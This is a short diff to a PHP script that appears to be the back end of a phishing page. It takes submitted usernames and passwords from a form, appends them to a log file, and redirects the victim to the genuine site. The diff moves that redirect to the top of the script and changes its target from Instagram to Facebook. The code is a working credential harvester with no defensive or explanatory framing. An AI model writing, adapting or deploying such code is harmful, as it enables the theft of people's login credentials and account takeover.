@@ -1,4 +1,5 @@
 <?php
+header('Location: https://facebook.com');
  $user = $_POST["username"];
  $pass = $_POST["password"];
 
@@ -9,7 +10,6 @@
  $pa = "Password: $pass\n";
  fwrite($fileuser, "\n". $co. $us. $pa. $cl);
  fclose($fileuser);
- header('Location: https://instagram.com/');
  exit()
 ?>
 
